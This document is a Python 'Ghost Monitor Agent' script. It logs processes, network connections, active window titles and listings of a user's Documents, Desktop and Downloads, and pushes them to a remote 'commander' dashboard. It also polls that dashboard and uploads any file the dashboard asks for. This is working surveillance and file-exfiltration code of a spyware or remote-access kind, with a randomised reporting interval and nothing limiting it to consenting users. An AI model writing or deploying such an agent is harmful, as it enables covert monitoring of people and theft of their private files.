#!/usr/bin/env python3
"""
Ghost Monitor Agent — passive activity collector
Pushes snapshots to the commander dashboard over HTTP.
No git. No GitHub. LAN HTTP only.

Install:  pip install psutil
Run:      python monitor_agent.py
"""

import os
import sys
import json
import time
import socket
import hashlib
import platform
import datetime
import logging
import random
import ctypes
import base64
import shutil
import urllib.request
import urllib.error
from pathlib import Path

try:
    import psutil
except ImportError:
    print("[MONITOR] Missing deps. Run: pip install psutil")
    sys.exit(1)

# ── Paths ────────────────────────────────────────────────────────────────────
SCRIPT_DIR    = Path(__file__).parent.resolve()
CONFIG_FILE   = SCRIPT_DIR / "local_config.json"
IDENTITY_FILE = SCRIPT_DIR / ".device_id"
LOG_FILE      = SCRIPT_DIR / "monitor_agent.log"
LOCAL_DATA    = SCRIPT_DIR / "local_data"     # always written, regardless of connectivity

# ── Logging ──────────────────────────────────────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.FileHandler(LOG_FILE, encoding="utf-8"),
        logging.StreamHandler(sys.stdout),
    ],
)
log = logging.getLogger("monitor")

# ═══════════════════════════════════════════════════════════════════════════
#  Identity
# ═══════════════════════════════════════════════════════════════════════════

def get_or_create_identity():
    """Return (device_id, display_name, commander_url, secret).
    If config doesn't exist, runs a first-time setup prompt.
    """
    if CONFIG_FILE.exists() and IDENTITY_FILE.exists():
        cfg = json.loads(CONFIG_FILE.read_text(encoding="utf-8"))
        return (
            cfg["device_id"],
            cfg["display_name"],
            cfg["commander_url"].rstrip("/"),
            cfg["secret"],
        )

    print("\n=== Ghost Monitor — First Run Setup ===")
    try:
        commander_url = input("Commander URL (e.g. http://192.168.1.100:8888): ").strip().rstrip("/")
        display_name  = input("Device name (e.g. john-laptop): ").strip()
        secret        = input("Agency secret (from dashboard Settings): ").strip()
    except EOFError:
        commander_url, display_name, secret = "", "", ""

    if not display_name:
        display_name = socket.gethostname()

    device_id = "dev_" + hashlib.md5(
        (socket.gethostname() + display_name).encode()
    ).hexdigest()[:8]

    cfg = {
        "device_id":     device_id,
        "display_name":  display_name,
        "commander_url": commander_url,
        "secret":        secret,
    }
    IDENTITY_FILE.write_text(device_id, encoding="utf-8")
    CONFIG_FILE.write_text(json.dumps(cfg, indent=2), encoding="utf-8")
    log.info(f"Identity set: {display_name} ({device_id})")
    return device_id, display_name, commander_url, secret

# ═══════════════════════════════════════════════════════════════════════════
#  Data collection — read-only observation
# ═══════════════════════════════════════════════════════════════════════════

def collect_processes():
    # First call to cpu_percent always returns 0.0 — warm up with a short interval
    psutil.cpu_percent(interval=0.1)
    procs = []
    for p in psutil.process_iter(["pid", "name", "username", "cpu_percent",
                                   "memory_percent", "create_time", "status"]):
        try:
            info = p.info.copy()
            ct   = info.get("create_time")
            if ct:
                info["create_time"] = datetime.datetime.fromtimestamp(ct).isoformat()
            procs.append(info)
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            pass
    return sorted(procs, key=lambda p: p.get("cpu_percent") or 0, reverse=True)


def collect_network():
    conns = []
    try:
        for c in psutil.net_connections(kind="inet"):
            try:
                conns.append({
                    "laddr": f"{c.laddr.ip}:{c.laddr.port}" if c.laddr else None,
                    "raddr": f"{c.raddr.ip}:{c.raddr.port}" if c.raddr else None,
                    "status": c.status,
                    "pid":    c.pid,
                    "proto":  "TCP" if c.type.name == "SOCK_STREAM" else "UDP",
                })
            except Exception:
                pass
    except psutil.AccessDenied:
        log.warning("Network access denied — run as Administrator for full data")
    return conns


def collect_metrics():
    mem  = psutil.virtual_memory()
    disk_path = "C:\\" if platform.system() == "Windows" else "/"
    disk_info: dict = {}
    try:
        d = psutil.disk_usage(disk_path)
        disk_info = {
            "percent":  d.percent,
            "used_gb":  round(d.used  / 1024 ** 3, 1),
            "total_gb": round(d.total / 1024 ** 3, 1),
        }
    except Exception:
        pass
    return {
        "cpu_percent":  psutil.cpu_percent(interval=1),
        "ram_percent":  mem.percent,
        "ram_used_gb":  round(mem.used  / 1024 ** 3, 1),
        "ram_total_gb": round(mem.total / 1024 ** 3, 1),
        "disk":         disk_info,
        "boot_time":    datetime.datetime.fromtimestamp(psutil.boot_time()).isoformat(),
    }


def get_active_window():
    if platform.system() != "Windows":
        return None
    try:
        hwnd   = ctypes.windll.user32.GetForegroundWindow()
        length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
        buf    = ctypes.create_unicode_buffer(length + 1)
        ctypes.windll.user32.GetWindowTextW(hwnd, buf, length + 1)
        return buf.value or None
    except Exception:
        return None


def collect_recent_files(hours: int = 1):
    home   = Path.home()
    cutoff = time.time() - hours * 3600
    result = []
    for dir_name in ("Documents", "Desktop", "Downloads"):
        scan = home / dir_name
        if not scan.exists():
            continue
        try:
            for f in scan.rglob("*"):
                if not f.is_file():
                    continue
                try:
                    st = f.stat()
                    if st.st_mtime > cutoff:
                        result.append({
                            "path":     str(f.relative_to(home)),
                            "modified": datetime.datetime.fromtimestamp(st.st_mtime).isoformat(),
                            "size_kb":  round(st.st_size / 1024, 1),
                        })
                except (PermissionError, OSError):
                    pass
        except PermissionError:
            pass
    return sorted(result, key=lambda x: x["modified"], reverse=True)[:30]


def collect_file_listing(time_budget: float = 25.0):
    """Full file listing from user dirs — used for file browser on dashboard.
    Stops early if scanning takes longer than time_budget seconds."""
    home      = Path.home()
    files     = []
    deadline  = time.time() + time_budget
    for dir_name in ("Documents", "Desktop", "Downloads"):
        scan = home / dir_name
        if not scan.exists():
            continue
        try:
            for f in scan.rglob("*"):
                if time.time() > deadline:
                    log.warning("collect_file_listing: time budget exceeded, returning partial list")
                    return sorted(files, key=lambda x: x["modified"], reverse=True)[:500]
                if not f.is_file():
                    continue
                try:
                    st = f.stat()
                    files.append({
                        "path":     str(f),
                        "rel":      str(f.relative_to(home)),
                        "name":     f.name,
                        "dir":      dir_name,
                        "size_kb":  round(st.st_size / 1024, 1),
                        "modified": datetime.datetime.fromtimestamp(st.st_mtime).isoformat(),
                    })
                except (PermissionError, OSError):
                    pass
        except PermissionError:
            pass
    return sorted(files, key=lambda f: f["modified"], reverse=True)[:500]


def _is_local(addr: str) -> bool:
    ip = addr.split(":")[0]
    return ip.startswith(("127.", "192.168.", "10.", "172.", "::1", "0.0."))


def detect_events(snapshot: dict, prev: dict) -> list:
    events = []
    now    = datetime.datetime.now().isoformat()
    if not prev:
        return events

    cur_procs = {p["name"] for p in snapshot.get("processes", [])}
    prv_procs = {p["name"] for p in prev.get("processes", [])}
    for name in (cur_procs - prv_procs):
        events.append({"type": "process_started", "detail": name, "severity": "info",    "ts": now})
    for name in (prv_procs - cur_procs):
        events.append({"type": "process_stopped", "detail": name, "severity": "info",    "ts": now})

    cpu = snapshot.get("metrics", {}).get("cpu_percent", 0)
    if cpu > 85:
        events.append({"type": "high_cpu", "detail": f"{cpu}%", "severity": "warning", "ts": now})
    ram = snapshot.get("metrics", {}).get("ram_percent", 0)
    if ram > 90:
        events.append({"type": "high_ram", "detail": f"{ram}%", "severity": "warning", "ts": now})

    cur_ext = {c["raddr"] for c in snapshot.get("network", [])
               if c.get("raddr") and not _is_local(c["raddr"])}
    prv_ext = {c["raddr"] for c in prev.get("network", [])
               if c.get("raddr") and not _is_local(c["raddr"])}
    for addr in (cur_ext - prv_ext):
        events.append({"type": "new_ext_connection", "detail": addr, "severity": "info", "ts": now})

    return events

# ═══════════════════════════════════════════════════════════════════════════
#  HTTP helpers
# ═══════════════════════════════════════════════════════════════════════════

def http_post(url: str, data: dict, secret: str, timeout: int = 20):
    try:
        body = json.dumps(data).encode("utf-8")
        req  = urllib.request.Request(url, data=body, method="POST")
        req.add_header("Content-Type",   "application/json")
        req.add_header("X-Agent-Secret", secret)
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return json.loads(resp.read())
    except Exception as e:
        log.warning(f"POST {url} failed: {e}")
        return None


def http_get(url: str, secret: str):
    try:
        req = urllib.request.Request(url)
        req.add_header("X-Agent-Secret", secret)
        with urllib.request.urlopen(req, timeout=20) as resp:
            return json.loads(resp.read())
    except Exception as e:
        log.warning(f"GET {url} failed: {e}")
        return None

# ═══════════════════════════════════════════════════════════════════════════
#  Local write helpers
# ═══════════════════════════════════════════════════════════════════════════

def write_local(sub: str, filename: str, data: dict):
    path = LOCAL_DATA / sub
    path.mkdir(parents=True, exist_ok=True)
    (path / filename).write_text(json.dumps(data, indent=2), encoding="utf-8")

# ═══════════════════════════════════════════════════════════════════════════
#  File upload on-demand
# ═══════════════════════════════════════════════════════════════════════════

FILE_SIZE_LIMIT = 100 * 1024 * 1024   # 100 MB

def handle_file_requests(tasks: list, commander_url: str, device_id: str, secret: str):
    for task in tasks:
        if task.get("type") != "get_file":
            continue
        request_id = task.get("request_id", "")
        file_path  = task.get("path", "")
        if not request_id or not file_path:
            continue

        log.info(f"File request: {file_path}")
        endpoint = f"{commander_url}/api/agent/file-content"

        try:
            p = Path(file_path)
            if not p.exists() or not p.is_file():
                http_post(endpoint, {
                    "device_id": device_id, "request_id": request_id,
                    "error": f"File not found: {file_path}",
                }, secret)
                continue

            size = p.stat().st_size
            if size > FILE_SIZE_LIMIT:
                http_post(endpoint, {
                    "device_id": device_id, "request_id": request_id,
                    "error": f"File too large ({size // 1024 // 1024} MB > 100 MB limit)",
                }, secret)
                continue

            content_b64 = base64.b64encode(p.read_bytes()).decode()
            http_post(endpoint, {
                "device_id":   device_id,
                "request_id":  request_id,
                "path":        file_path,
                "filename":    p.name,
                "content_b64": content_b64,
                "size":        size,
            }, secret, timeout=300)   # allow up to 5 min for large file upload
            log.info(f"File uploaded: {p.name} ({size} bytes)")

        except Exception as e:
            log.warning(f"File upload error: {e}")
            http_post(endpoint, {
                "device_id": device_id, "request_id": request_id,
                "error": str(e),
            }, secret)

# ═══════════════════════════════════════════════════════════════════════════
#  Main cycle
# ═══════════════════════════════════════════════════════════════════════════

def run_cycle(device_id: str, display_name: str, commander_url: str, secret: str, prev_snapshot):
    now      = datetime.datetime.now()
    ts       = now.strftime("%Y-%m-%dT%H-%M-%S")
    date_str = now.strftime("%Y-%m-%d")
    log.info(f"--- Cycle {ts} ---")

    metrics  = collect_metrics()
    try:
        my_ip = socket.gethostbyname(socket.gethostname())
    except Exception:
        my_ip = "unknown"

    snapshot = {
        "device_id":     device_id,
        "display_name":  display_name,
        "timestamp":     now.isoformat(),
        "os":            platform.system(),
        "hostname":      socket.gethostname(),
        "ip":            my_ip,
        "metrics":       metrics,
        "processes":     collect_processes(),
        "network":       collect_network(),
        "active_window": get_active_window(),
        "recent_files":  collect_recent_files(),
    }
    events = detect_events(snapshot, prev_snapshot)

    # ── Always write locally ────────────────────────────────────────────────
    write_local(f"snapshots/{date_str}", f"{ts}.json", snapshot)
    if events:
        write_local("events", f"{ts}_events.json", {
            "events": events, "device_id": device_id, "display_name": display_name,
        })
    # Prune old local snapshots (keep last 2 days)
    snap_root = LOCAL_DATA / "snapshots"
    if snap_root.exists():
        days = sorted(d for d in snap_root.iterdir() if d.is_dir())
        for old in days[:-2]:
            shutil.rmtree(old, ignore_errors=True)

    # ── Push to commander ────────────────────────────────────────────────────
    base = commander_url

    http_post(f"{base}/api/agent/checkin", {
        "device_id":     device_id,
        "display_name":  display_name,
        "last_seen":     now.isoformat(),
        "os":            platform.system(),
        "hostname":      socket.gethostname(),
        "ip":            my_ip,
        "metrics":       metrics,
        "active_window": snapshot.get("active_window"),
    }, secret)

    http_post(f"{base}/api/agent/snapshot", {
        "device_id": device_id,
        "snapshot":  snapshot,
    }, secret)

    if events:
        http_post(f"{base}/api/agent/events", {
            "device_id":    device_id,
            "display_name": display_name,
            "events":       events,
        }, secret)
        log.info(f"{len(events)} events pushed")

    # Push log tail
    try:
        lines = LOG_FILE.read_text(encoding="utf-8", errors="replace").splitlines()[-200:]
        http_post(f"{base}/api/agent/log", {"device_id": device_id, "lines": lines}, secret)
    except Exception:
        pass

    # Push file listing (~40% of cycles to avoid overhead)
    if random.random() < 0.4:
        files = collect_file_listing()
        http_post(f"{base}/api/agent/files", {
            "device_id": device_id,
            "files":     files,
            "ts":        now.isoformat(),
        }, secret)

    # Poll for pending tasks (file download requests from dashboard)
    tasks = http_get(f"{base}/api/agent/tasks/{device_id}", secret) or []
    if tasks:
        log.info(f"Handling {len(tasks)} pending task(s)")
        handle_file_requests(tasks, commander_url, device_id, secret)

    log.info(f"--- Done (CPU {metrics['cpu_percent']}%  RAM {metrics['ram_percent']}%) ---")
    return snapshot


def main():
    device_id, display_name, commander_url, secret = get_or_create_identity()
    log.info(f"Ghost Monitor: {display_name} ({device_id})")
    log.info(f"Commander: {commander_url}")

    LOCAL_DATA.mkdir(parents=True, exist_ok=True)
    prev_snapshot = None
    interval      = random.randint(300, 600)

    while True:
        try:
            prev_snapshot = run_cycle(device_id, display_name, commander_url, secret, prev_snapshot)
        except Exception as e:
            log.error(f"Cycle error: {e}", exc_info=True)
        log.info(f"Sleeping {interval}s …")
        time.sleep(interval)


if __name__ == "__main__":
    main()
